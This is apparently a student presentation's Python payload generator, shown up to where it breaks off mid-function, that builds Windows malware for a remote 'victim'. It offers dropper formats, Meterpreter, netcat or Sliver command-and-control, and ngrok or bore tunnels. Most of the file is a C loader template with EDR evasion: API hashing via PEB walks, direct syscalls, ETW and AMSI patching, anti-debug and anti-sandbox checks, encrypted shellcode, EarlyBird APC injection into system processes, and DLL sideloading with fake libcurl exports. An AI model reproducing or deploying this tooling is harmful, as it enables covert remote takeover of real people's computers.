#!/usr/bin/env python3
"""
Generador automatico de payload — IDEX Carlos Salazar Romero
Uso: python3 generador.py
"""

import subprocess, os, sys, threading, http.server, socketserver
import time, shutil, json, urllib.request, itertools, secrets, struct, base64

def _instalar_dependencias():
    pkgs = []
    try:    import openpyxl
    except: pkgs.append("openpyxl")
    try:    from PIL import Image
    except: pkgs.append("pillow")
    if pkgs:
        subprocess.run([sys.executable,"-m","pip","install","-q"]+pkgs, check=False)

_instalar_dependencias()

R='\033[91m'; G='\033[92m'; Y='\033[93m'
W='\033[97m'; B='\033[1m';  D='\033[2m';  X='\033[0m'

PUERTO_PAYLOAD = 443
PUERTO_HTTP    = 8000
ARCHIVO_RC     = "listener.rc"
CERT_PATH      = "/tmp/_msf_cert.pem"
ZIP_PASSWORD   = "update2025"

def ok(t):   print(f"  {G}[OK]{X}  {t}")
def info(t): print(f"  {D}[>>]{X}  {t}")
def warn(t): print(f"  {Y}[!!]{X}  {t}")
def err_fatal(t): print(f"\n  {R}[ERROR]{X}  {B}{t}{X}\n"); sys.exit(1)

def titulo_seccion(t):
    print(f"\n  {D}┌{'─'*40}┐{X}\n  {D}│{X}  {B}{W}{t}{X}\n  {D}└{'─'*40}┘{X}\n")

def typewriter(t, color="", delay=0.028):
    for c in t: sys.stdout.write(f"{color}{c}{X}"); sys.stdout.flush(); time.sleep(delay)
    print()

def con_spinner(msg, fn, *args, **kw):
    res=[None]; done=[False]
    def _r(): res[0]=fn(*args,**kw); done[0]=True
    t=threading.Thread(target=_r,daemon=True); t.start()
    for c in itertools.cycle('|/-\\'):
        if done[0]: break
        sys.stdout.write(f'\r  {W}{c}{X}  {D}{msg}{X}'); sys.stdout.flush(); time.sleep(0.08)
    sys.stdout.write('\r'+' '*72+'\r'); sys.stdout.flush()
    return res[0]

def boot_sequence():
    os.system("clear")
    for l in ["Initializing exploit framework     ","Loading payload modules            ",
              "Scanning network interfaces        ","Mounting reverse HTTPS engine      ",
              "Generating XOR encryption key      ","All systems nominal                "]:
        for c in ["[    ]","[=   ]","[==  ]","[=== ]","[====]"]:
            sys.stdout.write(f"\r  {D}{c}  {l}{X}"); sys.stdout.flush(); time.sleep(0.045)
        print(f"\r  {G}[ OK ]{X}  {D}{l}{X}")
    time.sleep(0.4); os.system("clear")

def banner(animado=False):
    arte=[f"",
        f"  {R}{B}████████╗██████╗  ██████╗ ██╗   ██╗  █████╗  ███╗   ██╗{X}",
        f"  {R}{B}   ██╔══╝██╔══██╗██╔═══██╗╚██╗ ██╔╝ ██╔══██╗ ████╗  ██║{X}",
        f"  {R}{B}   ██║   ██████╔╝██║   ██║ ╚████╔╝  ███████║ ██╔██╗ ██║{X}",
        f"  {R}{B}   ██║   ██╔══██╗██║   ██║  ╚██╔╝   ██╔══██║ ██║╚██╗██║{X}",
        f"  {R}{B}   ██║   ██║  ██║╚██████╔╝   ██║    ██║  ██║ ██║ ╚████║{X}",
        f"  {R}{B}   ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═╝  ╚═╝ ╚═╝  ╚═══╝{X}",f"",
        f"  {R}{B}  ██████╗ ███████╗███╗  ██╗███████╗██████╗  █████╗ ████████╗{X}",
        f"  {R}{B} ██╔════╝ ██╔════╝████╗ ██║██╔════╝██╔══██╗██╔══██╗  ██╔══╝{X}",
        f"  {R}{B} ██║  ███╗█████╗  ██╔██╗██║█████╗  ██████╔╝███████║  ██║   {X}",
        f"  {R}{B} ██║   ██║██╔══╝  ██║╚████║██╔══╝  ██╔══██╗██╔══██║  ██║   {X}",
        f"  {R}{B} ╚██████╔╝███████╗██║ ╚███║███████╗██║  ██║██║  ██║  ██║   {X}",
        f"  {R}{B}  ╚═════╝ ╚══════╝╚═╝  ╚══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝  ╚═╝  {X}",f""]
    for l in arte: print(l); time.sleep(0.055) if animado else None
    ancho=56; sep=f"  {R}{B}{'═'*ancho}{X}"
    print(sep)
    print(f"  {B}{W}  {'EXPOSICION FINAL':^{ancho-2}}{X}")
    print(f"  {B}{W}  {'IDEX Carlos Salazar Romero':^{ancho-2}}{X}")
    print(sep)
    for n in ["Luna Cossio Brenda","Lopez Quezada Lisman","Guerra Acosta Cristian"]:
        print(f"  {D}  {n:<{ancho-2}}{X}")
    print(sep); print()

# ──────────────────────────────────────────────────────────────────────────────
# MENUS
# ──────────────────────────────────────────────────────────────────────────────

def preguntar_red():
    titulo_seccion("CONFIGURACION DE RED")
    print(f"  {W}La victima esta en la misma red?{X}\n")
    print(f"  {G}[s]{X}  Si — mismo router")
    print(f"  {Y}[n]{X}  No — redes distintas"); print()
    while True:
        r=input(f"  {D}> {X}").strip().lower()
        if r in ["s","n"]: break
        warn("Ingresa s o n.")
    if r=="s": return True,None
    print(f"\n  {W}Metodo de tunel:{X}\n")
    print(f"  {G}[1]{X}  ngrok    {D}— requiere cuenta{X}")
    print(f"  {Y}[2]{X}  bore.pub {D}— sin cuenta{X}"); print()
    while True:
        m=input(f"  {D}> {X}").strip()
        if m=="1": return False,"ngrok"
        if m=="2": return False,"bore"
        warn("Ingresa 1 o 2.")

def preguntar_nombre_y_formato():
    titulo_seccion("CONFIGURACION DEL ARCHIVO")
    print(f"  {W}Nombre del archivo{X} {D}(sin extension){X}\n")
    while True:
        n=input(f"  {D}> {X}").strip()
        if n: break
        warn("Ingresa un nombre.")
    print(f"\n  {W}Formato de salida{X}\n")
    print(f"  {G}[1]{X}  .exe   {D}— loader directo (IAT limpia, PEB walk, Hell's Gate){X}")
    print(f"  {Y}[2]{X}  .msi   {D}— instalador NSIS (ventana real, extrae+ejecuta){X}")
    print(f"  {W}[3]{X}  .hta   {D}— HTML Application (descarga+AMSI bypass, 0 popup){X}")
    print(f"  {G}[4]{X}  .xlsm  {D}— Excel macro VBA (descarga exe, activa macros){X}")
    print(f"  {Y}[5]{X}  .lnk   {D}— acceso directo Windows (PS silencioso, <1% deteccion){X}")
    print(f"  {R}[6]{X}  EXE    {D}— {B}LIBRECRI{D}: EXE unico, C2 custom, sin firmas conocidas, anti-sandbox{X}")
    print()
    while True:
        op=input(f"  {D}> {X}").strip()
        if op in ["1","2","3","4","5","6"]: return n,op
        warn("Ingresa 1-6.")

def preguntar_backend_c2():
    titulo_seccion("BACKEND C2")
    print(f"  {W}Framework C2:{X}\n")
    print(f"  {G}[1]{X}  Meterpreter       {D}— Metasploit, completo{X}")
    print(f"  {G}[2]{X}  Shell Custom (nc)  {D}— {Y}RAPIDO ~20s{D}, cmd.exe remoto, listener: netcat{X}")
    print(f"  {Y}[3]{X}  Sliver C2          {D}— moderno, menos firmas AV (20 min compile){X}"); print()
    while True:
        r=input(f"  {D}> {X}").strip()
        if r in ["1","2","3"]: return r
        warn("Ingresa 1, 2 o 3.")

# ──────────────────────────────────────────────────────────────────────────────
# TUNELES
# ──────────────────────────────────────────────────────────────────────────────

def obtener_ip_local():
    r=subprocess.run(["hostname","-I"],capture_output=True,text=True)
    for ip in r.stdout.strip().split():
        if not ip.startswith("127.") and ":" not in ip: return ip
    return None

def verificar_ngrok(): return shutil.which("ngrok") is not None

def instalar_ngrok():
    if subprocess.run(["sudo","snap","install","ngrok"],capture_output=True).returncode==0: return True
    for cmd in [["wget","-q","https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz","-O","/tmp/ngrok.tgz"],
                ["tar","-xzf","/tmp/ngrok.tgz","-C","/tmp/"],["sudo","mv","/tmp/ngrok","/usr/local/bin/ngrok"]]:
        if subprocess.run(cmd,capture_output=True).returncode!=0: return False
    return verificar_ngrok()

def configurar_token(token):
    return subprocess.run(["ngrok","config","add-authtoken",token],capture_output=True).returncode==0

def obtener_config_default_ngrok():
    r=subprocess.run(["ngrok","config","check"],capture_output=True,text=True)
    for l in (r.stdout+r.stderr).splitlines():
        if "configuration file at" in l.lower(): return l.split("at")[-1].strip()
    return os.path.expanduser("~/.config/ngrok/ngrok.yml")

def generar_config_ngrok(ruta):
    with open(ruta,"w") as f:
        f.write(f'version: "3"\ntunnels:\n  payload:\n    proto: tcp\n    addr: {PUERTO_PAYLOAD}\n  servidor:\n    proto: http\n    addr: {PUERTO_HTTP}\n')

def instalar_bore(carpeta):
    ruta=os.path.join(carpeta,"bore")
    if os.path.exists(ruta) and os.access(ruta,os.X_OK): return ruta
    url="https://github.com/ekzhang/bore/releases/download/v0.5.0/bore-v0.5.0-x86_64-unknown-linux-musl.tar.gz"
    if subprocess.run(["wget","-q",url,"-O","/tmp/bore.tar.gz"],capture_output=True).returncode!=0: return None
    subprocess.run(["tar","-xzf","/tmp/bore.tar.gz","-C","/tmp/"],capture_output=True)
    if not os.path.exists("/tmp/bore"): return None
    shutil.copy("/tmp/bore",ruta); os.chmod(ruta,0o755); return ruta

def iniciar_bore_tunel(ruta_bore,puerto_local):
    import re
    proc=subprocess.Popen([ruta_bore,"local",str(puerto_local),"--to","bore.pub"],
                          stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True,bufsize=1)
    for _ in range(30):
        time.sleep(0.4)
        if proc.poll() is not None: break
        try:
            m=re.search(r'bore\.pub:(\d+)',proc.stdout.readline())
            if m: return int(m.group(1)),proc
        except: break
    proc.terminate(); return None,None

def iniciar_ngrok(ruta_config):
    cfg=obtener_config_default_ngrok()
    proc=subprocess.Popen(["ngrok","start","--all","--config",cfg,"--config",ruta_config],
                          stdout=subprocess.DEVNULL,stderr=subprocess.PIPE)
    for _ in range(25):
        time.sleep(1)
        if proc.poll() is not None: return None,None,None,None
        try:
            with urllib.request.urlopen("http://localhost:4040/api/tunnels",timeout=2) as r:
                if len(json.loads(r.read()).get("tunnels",[]))>=2: break
        except: continue
    else: proc.terminate(); return None,None,None,None
    url_http=ngrok_host=ngrok_port=None
    try:
        with urllib.request.urlopen("http://localhost:4040/api/tunnels",timeout=3) as r:
            for t in json.loads(r.read()).get("tunnels",[]):
                pu=t.get("public_url","")
                if t.get("proto")=="tcp" and "tcp://" in pu:
                    p=pu.replace("tcp://","").split(":"); ngrok_host=p[0]; ngrok_port=int(p[1])
                elif t.get("proto") in ("https","http") and not url_http: url_http=pu
    except: proc.terminate(); return None,None,None,None
    return url_http,ngrok_host,ngrok_port,proc

# ──────────────────────────────────────────────────────────────────────────────
# LOADER C — ULTIMATE VERSION
# IAT limpia: VirtualAlloc, CreateProcessA, ResumeThread, CloseHandle,
#             TerminateProcess, CreateThread, WaitForSingleObject
#             todos resueltos via PEB walk en runtime (NO en IAT).
# ETW blind via NtProtectVirtualMemory syscall (no VirtualProtect en IAT).
# Hell's Gate + Halo's Gate con SSN via hash (no strings de funciones Nt*).
# Todos los strings XOR-encriptados en Python antes de compilar.
# Anti-debug via PEB (BeingDebugged + NtGlobalFlag).
# Anti-sandbox: timing, mouse, resolución, disco, username, CPU.
# EarlyBird APC con lista de targets (RuntimeBroker > dllhost > notepad).
# ──────────────────────────────────────────────────────────────────────────────

def _resolver_ip(host):
    import socket
    try: return socket.gethostbyname(host)
    except: return host

def _djb2(s):
    """DJB2 hash en Python — mismo algoritmo que el C runtime."""
    h=5381
    for c in s: h=((h<<5)+h)^ord(c); h&=0xFFFFFFFF
    return h

def _build_loader_c(key_arr, sc_arr, dll_mode=False):
    # ── Hashes pre-computados en Python (sin strings en el binario) ──────────
    # Modulos: lowercase porque el PEB walk hace lowercase
    H_K32   = _djb2("kernel32.dll")
    H_NTDLL = _djb2("ntdll.dll")
    # Funciones kernel32 (case-sensitive, exact)
    H_VA    = _djb2("VirtualAlloc")
    H_CPA   = _djb2("CreateProcessA")
    H_RT    = _djb2("ResumeThread")
    H_CH    = _djb2("CloseHandle")
    H_TP    = _djb2("TerminateProcess")
    H_CT    = _djb2("CreateThread")
    H_WFSO  = _djb2("WaitForSingleObject")
    # Funciones ntdll (hashes de los syscalls Nt*)
    H_NTAVM = _djb2("NtAllocateVirtualMemory")
    H_NTWVM = _djb2("NtWriteVirtualMemory")
    H_NTPVM = _djb2("NtProtectVirtualMemory")
    H_NTQAT = _djb2("NtQueueApcThread")
    H_ETW   = _djb2("EtwEventWrite")
    H_NSIT  = _djb2("NtSetInformationThread")
    # AMSI bypass
    H_AMSI  = _djb2("amsi.dll")           # modulo: lowercase
    H_AMSB  = _djb2("AmsiScanBuffer")     # funcion: case-sensitive
    H_LLA   = _djb2("LoadLibraryA")       # kernel32 LoadLibraryA
    H_VP    = _djb2("VirtualProtect")     # para W^X en make_stub

    # ── Strings XOR'd en Python → arrays C ───────────────────────────────────
    KS = 0x5A  # clave de XOR para strings en loader
    def xs_arr(s):
        return "{"+",".join(f"0x{b^KS:02X}" for b in s.encode())+"}",len(s)

    rb_arr,  rb_n  = xs_arr("C:\\Windows\\System32\\RuntimeBroker.exe")
    dh_arr,  dh_n  = xs_arr("C:\\Windows\\System32\\dllhost.exe")
    np_arr,  np_n  = xs_arr("C:\\Windows\\System32\\notepad.exe")
    ex_arr,  ex_n  = xs_arr("C:\\Windows\\explorer.exe")  # fallback — siempre corre
    usr_bad         = ["sandbox","virus","malware","test","john","vmuser","currentuser","admin1"]
    ud_arr = "{"+ ",".join(str(ord(c)^KS) for w in usr_bad for c in w+"\x00") +"}"
    ud_total = sum(len(w)+1 for w in usr_bad)

    # ── Bloque de entry point — EXE (WinMain) o DLL (DllMain + thread + exports) ──
    _payload_body = f"""
    if(en_sandbox()) return 0;
    resolve_apis();
    if(!gVA||!gCPA) return 0;
    DWORD ssn0=get_ssn(H_NTAVM),ssn1=get_ssn(H_NTWVM),ssn2=get_ssn(H_NTPVM),ssn3=get_ssn(H_NTQAT);
    DWORD ssn4=get_ssn(H_NSIT);
    if(!ssn0||!ssn1||!ssn2||!ssn3) return 0;
    pfnNtAVM NtAVM=(pfnNtAVM)make_stub(ssn0);
    pfnNtWVM NtWVM=(pfnNtWVM)make_stub(ssn1);
    pfnNtPVM NtPVM=(pfnNtPVM)make_stub(ssn2);
    pfnNtQAT NtQAT=(pfnNtQAT)make_stub(ssn3);
    pfnNtSIT NtSIT=(pfnNtSIT)(ssn4 ? make_stub(ssn4) : NULL);
    if(!NtAVM||!NtWVM||!NtPVM||!NtQAT) return 0;
    hide_thread(NtSIT);
    blind_etw(NtPVM);
    bypass_amsi(NtPVM);
    scrub_own_headers(NtPVM);
    rc4_dec(SC,sizeof(SC),KEY,(int)sizeof(KEY));
    if(earlybird(SC,sizeof(SC),NtAVM,NtWVM,NtPVM,NtQAT)) {{{{
        SecureZeroMemory(SC,sizeof(SC));
        return 0;
    }}}}
    PVOID base=NULL; SIZE_T sz=sizeof(SC);
    NtAVM(HPROC,&base,0,&sz,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    memcpy(base,SC,sizeof(SC));
    SecureZeroMemory(SC,sizeof(SC));
    PVOID b2=base; SIZE_T s2=sizeof(SC); ULONG old=0;
    NtPVM(HPROC,&b2,&s2,PAGE_EXECUTE_READ,&old);
    if(!gCT) return 0;
    HANDLE ht=gCT(NULL,0,(LPTHREAD_START_ROUTINE)base,NULL,0,NULL);
    if(ht) {{{{ gWFSO(ht,0xFFFFFFFF); gCH(ht); }}}}
    return 0;"""

    if dll_mode:
        _entrypoint = f"""
static DWORD WINAPI _payload_thread(LPVOID _arg) {{
    (void)_arg;
{_payload_body}
}}

/* ── Fake libcurl exports — GUP.exe no crashea, payload corre en background ── */
__declspec(dllexport) int         curl_global_init(long f)         {{ (void)f; return 0; }}
__declspec(dllexport) void*       curl_easy_init()                  {{ return 0; }}
__declspec(dllexport) int         curl_easy_setopt()                {{ return 0; }}
__declspec(dllexport) int         curl_easy_perform(void* h)        {{ (void)h; return 1; }}
__declspec(dllexport) void        curl_easy_cleanup(void* h)        {{ (void)h; }}
__declspec(dllexport) void        curl_global_cleanup()             {{}}
__declspec(dllexport) const char* curl_easy_strerror(int c)         {{ (void)c; return ""; }}
__declspec(dllexport) void*       curl_slist_append()               {{ return 0; }}
__declspec(dllexport) void        curl_slist_free_all(void* l)      {{ (void)l; }}
__declspec(dllexport) int         curl_easy_getinfo()               {{ return 0; }}
__declspec(dllexport) const char* curl_version()                    {{ return "libcurl/7.88.1"; }}
__declspec(dllexport) int         curl_easy_reset(void* h)          {{ (void)h; return 0; }}
__declspec(dllexport) void*       curl_easy_duphandle(void* h)      {{ (void)h; return 0; }}
__declspec(dllexport) char*       curl_easy_escape()                {{ return 0; }}
__declspec(dllexport) int         curl_global_init_mem()            {{ return 0; }}
__declspec(dllexport) void        curl_free(void* p)                {{ (void)p; }}

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID lpv) {{
    (void)lpv;
    if(reason==DLL_PROCESS_ATTACH) {{
        DisableThreadLibraryCalls(h);
        HANDLE t=CreateThread(NULL,0,_payload_thread,NULL,0,NULL);
        if(t) CloseHandle(t);
    }}
    return TRUE;
}}"""
    else:
        _entrypoint = f"""
int WINAPI WinMain(HINSTANCE h,HINSTANCE p,LPSTR c,int n) {{
    (void)h;(void)p;(void)c;(void)n;
{_payload_body}
}}"""

    return f"""
#include <windows.h>
#include <intrin.h>
#include <string.h>
#include <shellapi.h>
#include <commctrl.h>

/* ── Extern prototypes para IAT adicional (FRIEND fake_iat.go pattern) ────── */
extern UINT  WINAPI waveOutGetNumDevs(void);
extern HWND  WINAPI ImmGetDefaultIMEWnd(HWND);
extern DWORD WINAPI GetFileVersionInfoSizeA(LPCSTR,LPDWORD);

/* ── Fake IAT (FRIEND-pattern: imports legitimos, NUNCA ejecutados) ──────── */
static void __attribute__((used)) _dummy_legit(void) {{
    if(0) {{
        PostMessageA(0,0,0,0);
        RegisterClassExA(0);
        ShellExecuteA(0,"open",".",0,0,SW_SHOW);
        SendMessageA(0,WM_NULL,0,0);
        InitCommonControlsEx(NULL);          /* comctl32 */
        GetFileVersionInfoSizeA(NULL,NULL);  /* version  */
        waveOutGetNumDevs();                  /* winmm    */
        ImmGetDefaultIMEWnd(NULL);            /* imm32    */
    }}
}}

/* ── Pre-computed DJB2 hashes (Python-generated, zero strings in binary) ── */
#define H_K32   0x{H_K32:08X}UL
#define H_NTDLL 0x{H_NTDLL:08X}UL
#define H_VA    0x{H_VA:08X}UL
#define H_CPA   0x{H_CPA:08X}UL
#define H_RT    0x{H_RT:08X}UL
#define H_CH    0x{H_CH:08X}UL
#define H_TP    0x{H_TP:08X}UL
#define H_CT    0x{H_CT:08X}UL
#define H_WFSO  0x{H_WFSO:08X}UL
#define H_NTAVM 0x{H_NTAVM:08X}UL
#define H_NTWVM 0x{H_NTWVM:08X}UL
#define H_NTPVM 0x{H_NTPVM:08X}UL
#define H_NTQAT 0x{H_NTQAT:08X}UL
#define H_ETW   0x{H_ETW:08X}UL
#define H_NSIT  0x{H_NSIT:08X}UL
#define H_AMSI  0x{H_AMSI:08X}UL
#define H_AMSB  0x{H_AMSB:08X}UL
#define H_LLA   0x{H_LLA:08X}UL
#define H_VP    0x{H_VP:08X}UL
#define HPROC   ((HANDLE)(LONG_PTR)-1)

/* ── NT typedefs (sin incluir ntdef.h) ────────────────────────────────────── */
typedef LONG NTSTATUS;
typedef NTSTATUS(NTAPI *pfnNtAVM)(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG);
typedef NTSTATUS(NTAPI *pfnNtWVM)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T);
typedef NTSTATUS(NTAPI *pfnNtPVM)(HANDLE,PVOID*,PSIZE_T,ULONG,PULONG);
typedef NTSTATUS(NTAPI *pfnNtQAT)(HANDLE,PVOID,PVOID,PVOID,ULONG_PTR);
typedef NTSTATUS(NTAPI *pfnNtSIT)(HANDLE,ULONG,PVOID,ULONG);

/* ── Funciones kernel32 resueltas via PEB (NO en IAT) ─────────────────────── */
typedef LPVOID (WINAPI *fn_VA  )(LPVOID,SIZE_T,DWORD,DWORD);
typedef BOOL   (WINAPI *fn_CPA )(LPCSTR,LPSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION);
typedef DWORD  (WINAPI *fn_RT  )(HANDLE);
typedef BOOL   (WINAPI *fn_CH  )(HANDLE);
typedef BOOL   (WINAPI *fn_TP  )(HANDLE,UINT);
typedef HANDLE (WINAPI *fn_CT  )(LPSECURITY_ATTRIBUTES,SIZE_T,LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD);
typedef DWORD  (WINAPI *fn_WFSO)(HANDLE,DWORD);
typedef BOOL   (WINAPI *fn_VP  )(LPVOID,SIZE_T,DWORD,PDWORD);

static fn_VA   gVA;
static fn_CPA  gCPA;
static fn_RT   gRT;
static fn_CH   gCH;
static fn_TP   gTP;
static fn_CT   gCT;
static fn_WFSO gWFSO;
static fn_VP   gVP;
static PVOID   g_k32;
static PVOID   g_ntdll;

/* ── DJB2 runtime (para matching en export table) ──────────────────────────── */
static DWORD djb2(const char *s) {{
    DWORD h=5381;
    while(*s) h=((h<<5)+h)^(unsigned char)(*s++);
    return h;
}}

/* ── PEB walk: resolucion de modulo por hash ────────────────────────────────── */
static PVOID peb_get_module(DWORD hash) {{
    BYTE *peb=(BYTE*)__readgsqword(0x60);
    BYTE *ldr=*(BYTE**)(peb+0x18);
    LIST_ENTRY *head=(LIST_ENTRY*)(ldr+0x20);
    LIST_ENTRY *e=head->Flink;
    while(e!=head) {{
        /* InMemoryOrderLinks esta en offset 0x10 del entry — restar para llegar al inicio */
        PVOID dll_base =*(PVOID*)  ((BYTE*)e+0x20);  /* DllBase      @ entry+0x30 = e-0x10+0x30 = e+0x20 */
        USHORT name_len=*(USHORT*) ((BYTE*)e+0x48);  /* BaseDllName.Length @ entry+0x58 = e+0x48 */
        WCHAR *name_buf=*(WCHAR**)((BYTE*)e+0x50);  /* BaseDllName.Buffer @ entry+0x60 = e+0x50 */
        if(dll_base && name_buf && name_len>0) {{
            char tmp[64]={{0}};
            int n=(int)(name_len/2); if(n>63)n=63;
            for(int i=0;i<n;i++) {{
                char c=(char)name_buf[i];
                tmp[i]=(c>='A'&&c<='Z')?(char)(c+32):c;
            }}
            if(djb2(tmp)==hash) return dll_base;
        }}
        e=e->Flink;
    }}
    return NULL;
}}

/* ── RC4 decrypt (FRIEND-pattern: keystream pseudoaleatorio) ── */
static void rc4_dec(unsigned char *buf, SIZE_T len,
                    const unsigned char *key, int klen) {{
    unsigned char S[256], tmp; int i, j=0;
    for(i=0;i<256;i++) S[i]=(unsigned char)i;
    for(i=0;i<256;i++) {{
        j=(j+S[i]+key[i%klen])&0xFF;
        tmp=S[i]; S[i]=S[j]; S[j]=tmp;
    }}
    i=j=0;
    for(SIZE_T k=0;k<len;k++) {{
        i=(i+1)&0xFF; j=(j+S[i])&0xFF;
        tmp=S[i]; S[i]=S[j]; S[j]=tmp;
        buf[k]^=S[(unsigned char)(S[i]+S[j])];
    }}
}}

/* ── Export table walk: resolucion de funcion por hash ─────────────────────── */
static PVOID peb_get_proc(PVOID base, DWORD hash) {{
    BYTE *b=(BYTE*)base;
    if(!b||*(WORD*)b!=0x5A4D) return NULL;
    DWORD nt_off=*(DWORD*)(b+0x3C);
    BYTE *nt=b+nt_off;
    if(*(DWORD*)nt!=0x00004550) return NULL;
    DWORD exp_rva=*(DWORD*)(nt+0x18+0x70);
    if(!exp_rva) return NULL;
    BYTE *exp=b+exp_rva;
    DWORD  num  =*(DWORD*)(exp+0x18);
    DWORD *names=(DWORD*)(b+*(DWORD*)(exp+0x20));
    WORD  *ords =(WORD* )(b+*(DWORD*)(exp+0x24));
    DWORD *fns  =(DWORD*)(b+*(DWORD*)(exp+0x1C));
    for(DWORD i=0;i<num;i++) {{
        char *name=(char*)(b+names[i]);
        if(djb2(name)==hash) return (PVOID)(b+fns[ords[i]]);
    }}
    return NULL;
}}

/* ── Inicializa todos los punteros de funcion via PEB (limpia el IAT) ──────── */
static void resolve_apis(void) {{
    g_k32  =peb_get_module(H_K32);
    g_ntdll=peb_get_module(H_NTDLL);
    if(!g_k32||!g_ntdll) return;
    gVA  =(fn_VA  )peb_get_proc(g_k32,H_VA);
    gCPA =(fn_CPA )peb_get_proc(g_k32,H_CPA);
    gRT  =(fn_RT  )peb_get_proc(g_k32,H_RT);
    gCH  =(fn_CH  )peb_get_proc(g_k32,H_CH);
    gTP  =(fn_TP  )peb_get_proc(g_k32,H_TP);
    gCT  =(fn_CT  )peb_get_proc(g_k32,H_CT);
    gWFSO=(fn_WFSO)peb_get_proc(g_k32,H_WFSO);
    gVP  =(fn_VP  )peb_get_proc(g_k32,H_VP);
}}

/* ── Hell's Gate + Halo's Gate: SSN via hash, sin strings Nt* en binario ───── */
static DWORD get_ssn(DWORD fn_hash) {{
    BYTE *f=(BYTE*)peb_get_proc(g_ntdll,fn_hash);
    if(!f) return 0;
    if(f[0]==0x4C&&f[1]==0x8B&&f[2]==0xD1&&f[3]==0xB8) return *(DWORD*)(f+4);
    for(int i=1;i<=32;i++) {{
        BYTE *d=f+(i*32);
        if(d[0]==0x4C&&d[1]==0x8B&&d[2]==0xD1&&d[3]==0xB8) return *(DWORD*)(d+4)-i;
        BYTE *u=f-(i*32);
        if(u[0]==0x4C&&u[1]==0x8B&&u[2]==0xD1&&u[3]==0xB8) return *(DWORD*)(u+4)+i;
    }}
    return 0;
}}

/* ── make_stub: W^X — aloca RW, copia, cambia a RX (sin RWX en ningún momento) */
static void *make_stub(DWORD ssn) {{
    if(!ssn||!gVA||!gVP) return NULL;
    BYTE t[11]={{0x4C,0x8B,0xD1,0xB8,0,0,0,0,0x0F,0x05,0xC3}};
    void *m=gVA(NULL,16,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);  /* RW only */
    if(!m) return NULL;
    memcpy(m,t,11); *(DWORD*)((BYTE*)m+4)=ssn;
    DWORD old=0;
    gVP(m,16,PAGE_EXECUTE_READ,&old);                            /* RW → RX  */
    return m;
}}

/* ── String XOR decode (strings encriptados en Python, decoded en runtime) ──── */
static void xs(char *out, const unsigned char *enc, int n) {{
    for(int i=0;i<n;i++) out[i]=(char)(enc[i]^0x5A); out[n]=0;
}}

/* ── ETW blind: NtPVM syscall en vez de VirtualProtect (no VirtualProtect IAT) */
static void blind_etw(pfnNtPVM NtPVM) {{
    BYTE *f=(BYTE*)peb_get_proc(g_ntdll,H_ETW);
    if(!f) return;
    PVOID fp=f; SIZE_T sz=1; ULONG old=0;
    NtPVM(HPROC,&fp,&sz,PAGE_EXECUTE_READWRITE,&old);
    *f=0xC3;
    NtPVM(HPROC,&fp,&sz,old,&old);
}}

/* ── Anti-debug via PEB (sin IsDebuggerPresent en IAT) ─────────────────────── */
static int debugger_present(void) {{
    BYTE *peb=(BYTE*)__readgsqword(0x60);
    if(peb[2]) return 1;
    if((*(DWORD*)(peb+0xBC))==0x70) return 1;
    return 0;
}}

/* ── Anti-sandbox (minimo — solo anti-debug, sin checks de VM) ──────────────── */
static int en_sandbox(void) {{
    if(debugger_present()) return 1;
    /* Sleep corto para evadir sandbox de tiempo acelerado */
    DWORD t0=GetTickCount(); Sleep(800);
    if(GetTickCount()-t0<400) return 1;
    return 0;
}}

/* ── AMSI bypass: AmsiScanBuffer → xor eax,eax + ret = CLEAN ────────────── */
static void bypass_amsi(pfnNtPVM NtPVM) {{
    typedef HMODULE (WINAPI *fn_LL)(LPCSTR);
    fn_LL pLL=(fn_LL)peb_get_proc(g_k32,H_LLA);
    PVOID amsi=peb_get_module(H_AMSI);
    if(!amsi && pLL) amsi=pLL("amsi.dll");
    if(!amsi) return;
    BYTE *fn=(BYTE*)peb_get_proc(amsi,H_AMSB);
    if(!fn) return;
    /* MOV EAX, 0x80070057 (E_INVALIDARG); RET
       AMSI interpreta el error y devuelve AMSI_RESULT_CLEAN.
       Evita la firma estática de "xor eax,eax; ret" que Defender firma directamente. */
    BYTE p[]={{0xB8,0x57,0x00,0x07,0x80,0xC3}};
    PVOID fp=fn; SIZE_T sz=6; ULONG old=0;
    NtPVM(HPROC,&fp,&sz,PAGE_EXECUTE_READWRITE,&old);
    memcpy(fn,p,6);
    sz=6; fp=fn; NtPVM(HPROC,&fp,&sz,old,&old);
}}

/* ── EarlyBird APC: intenta lista de targets (sin strings en binario) ──────── */
static BOOL earlybird(const unsigned char *sc,SIZE_T sc_len,
                      pfnNtAVM NtAVM,pfnNtWVM NtWVM,pfnNtPVM NtPVM,pfnNtQAT NtQAT) {{
    unsigned char erb[]={rb_arr}; char srb[128]; xs(srb,(unsigned char*)erb,{rb_n});
    unsigned char edh[]={dh_arr}; char sdh[128]; xs(sdh,(unsigned char*)edh,{dh_n});
    unsigned char enp[]={np_arr}; char snp[128]; xs(snp,(unsigned char*)enp,{np_n});
    unsigned char eex[]={ex_arr}; char sex[128]; xs(sex,(unsigned char*)eex,{ex_n});  /* explorer.exe fallback */
    const char *targets[]={{srb,sdh,snp,sex,NULL}};

    for(int ti=0;targets[ti];ti++) {{
        STARTUPINFOA si={{sizeof(si)}}; PROCESS_INFORMATION pi={{0}};
        if(!gCPA(targets[ti],NULL,NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,&si,&pi)) continue;
        PVOID base=NULL; SIZE_T sz=sc_len;
        if(NtAVM(pi.hProcess,&base,0,&sz,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE)) {{
            gTP(pi.hProcess,0); gCH(pi.hThread); gCH(pi.hProcess); continue;
        }}
        SIZE_T wr=0; NtWVM(pi.hProcess,base,(PVOID)sc,sc_len,&wr);
        PVOID b2=base; SIZE_T s2=sc_len; ULONG old=0;
        NtPVM(pi.hProcess,&b2,&s2,PAGE_EXECUTE_READ,&old);
        NtQAT(pi.hThread,base,NULL,NULL,0);
        gRT(pi.hThread);
